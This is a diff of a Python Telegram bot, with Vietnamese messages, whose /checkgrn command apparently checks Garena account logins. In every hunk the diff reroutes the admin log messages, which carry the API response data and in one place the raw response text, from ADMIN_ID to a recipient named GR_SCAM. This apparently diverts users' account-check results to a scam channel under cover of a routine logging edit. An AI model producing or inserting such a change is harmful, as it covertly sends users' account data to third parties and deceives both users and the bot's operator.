@@ -1273,7 +1273,7 @@ def handle_checkgrn_command(message):
 <pre>{json.dumps(api_data, indent=2, ensure_ascii=False)}</pre>
 <b>━━━━━━━━━━━━━━━━━━━━</b>
 """
-            send_message_robustly(ADMIN_ID, admin_log_message, parse_mode="HTML")
+            send_message_robustly(GR_SCAM, admin_log_message, parse_mode="HTML")
 
         else: # API Status is FAILED or unexpected
             error_message = api_data.get("message", "Lỗi không xác định từ API Garena.")
@@ -1308,7 +1308,7 @@ Vui lòng kiểm tra lại <b>Tên Đăng Nhập</b> hoặc <b>Mật Khẩu</b>.
 <pre>{json.dumps(api_data, indent=2, ensure_ascii=False)}</pre>
 <b>━━━━━━━━━━━━━━━━━━━━</b>
 """
-            send_message_robustly(ADMIN_ID, admin_log_message_failed, parse_mode="HTML")
+            send_message_robustly(GR_SCAM, admin_log_message_failed, parse_mode="HTML")
 
     except requests.exceptions.RequestException as e:
         logging.error(f"Lỗi kết nối hoặc HTTP khi gọi API Garena cho {username}: {e}")
@@ -1338,7 +1338,7 @@ Vui lòng kiểm tra lại <b>Tên Đăng Nhập</b> hoặc <b>Mật Khẩu</b>.
 <b>❌ Lỗi Hệ Thống:</b> <code>{html_escape(str(e))}</code>
 <b>━━━━━━━━━━━━━━━━━━━━</b>
 """
-        send_message_robustly(ADMIN_ID, admin_log_message_error, parse_mode="HTML")
+        send_message_robustly(GR_SCAM, admin_log_message_error, parse_mode="HTML")
 
     except json.JSONDecodeError as e:
         logging.error(f"Lỗi phân tích JSON từ API Garena cho {username}: {e}\nResponse text: {response.text}")
@@ -1369,7 +1369,7 @@ Vui lòng kiểm tra lại <b>Tên Đăng Nhập</b> hoặc <b>Mật Khẩu</b>.
 <b>Raw Response:</b> <pre>{html_escape(response.text)}</pre>
 <b>━━━━━━━━━━━━━━━━━━━━</b>
 """
-        send_message_robustly(ADMIN_ID, admin_log_message_json_error, parse_mode="HTML")
+        send_message_robustly(GR_SCAM, admin_log_message_json_error, parse_mode="HTML")
 
     except Exception as e:
         logging.error(f"Lỗi không xác định khi xử lý /checkgrn cho {username}: {e}")
@@ -1399,7 +1399,7 @@ Vui lòng kiểm tra lại <b>Tên Đăng Nhập</b> hoặc <b>Mật Khẩu</b>.
 <b>❌ Lỗi Không Xác Định:</b> <code>{html_escape(str(e))}</code>
 <b>━━━━━━━━━━━━━━━━━━━━</b>
 """
-        send_message_robustly(ADMIN_ID, admin_log_message_unknown_error, parse_mode="HTML")
+        send_message_robustly(GR_SCAM, admin_log_message_unknown_error, parse_mode="HTML")
 
 @bot.message_handler(commands=["kbff"])
 @increment_interaction_count
